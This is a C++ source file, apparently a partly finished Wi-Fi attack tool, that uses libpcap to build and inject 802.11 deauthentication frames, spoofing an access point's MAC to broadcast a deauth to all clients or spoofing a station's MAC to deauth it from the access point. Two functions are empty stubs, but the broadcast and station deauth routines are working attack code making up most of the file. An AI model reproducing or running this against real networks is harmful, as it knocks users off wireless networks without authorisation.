#include "packet.h"
//AP MAC ADDR : argv[2], 88:88:88:88:88:88
//Station MAC ADDR : argv[3] 99:99:99:99:99:99

void ApBroadcast(pcap_t* handle, char* apMac){
    //Ap -> BroadCast 0xc000

    //Station MAC ADDR
    uint8_t send[6];

    //AP MAC ADDR
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct last packet;

    //header
    packet.rheader.it_version = 0;
    packet.rheader.it_pad = 0;
    packet.rheader.it_len = 0x08;
    packet.rheader.it_present = 0;

    //deauth
    packet.deauth.frame_control = 0x00c0;
    packet.deauth.duration_id = 0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.readdr1[i] = 0xff;
    }

    for(int i = 0;i<6;i++){
        packet.deauth.sourceaddr4[i] = send[i]; 
        packet.deauth.bssid[i] = send[i];
    }

    packet.deauth.sequence_control = 0;
    packet.fixed.ReasonCode = 0x0007;

    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
    }
}

void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Ap -> Station
}

void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Station -> AP
    
    //Station MAC ADDR
    uint8_t send[6];

    //AP MAC ADDR
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct last packet;

    //header
    packet.rheader.it_version = 0;
    packet.rheader.it_pad = 0;
    packet.rheader.it_len = 0x08;
    packet.rheader.it_present = 0;

    //deauth
    packet.deauth.frame_control = 0x10c0;
    packet.deauth.duration_id = 0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.readdr1[i] = des[i];
    }

    for(int i = 0;i<6;i++){
        packet.deauth.sourceaddr4[i] = send[i]; 
    }

    for(int i = 0;i<6;i++){
        packet.deauth.bssid[i] = des[i];
    }

    packet.deauth.sequence_control = 0;
    packet.fixed.ReasonCode = 0x0003;

    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
    }
}

void authentication(pcap_t* handle, char* apMac, char* stationMac){
    
}

int main(int argc, char* argv[]){
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        std::cerr << "network interface '" << argv[1] << "' is down: " << errbuf << std::endl;
        return 1;
    }
    printf("%d\n",argc);
    switch (argc) {
        case 3:
            ApBroadcast(handle, argv[2]);
            break;
        case 4:
            APUnicast(handle, argv[2], argv[3]);
            StationUnicast(handle, argv[2], argv[3]);
            break;
        case 5:
            authentication(handle, argv[2], argv[3]);
            break;
        default:
            usage();
            break;
    }

    pcap_close(handle);
    return 0;
}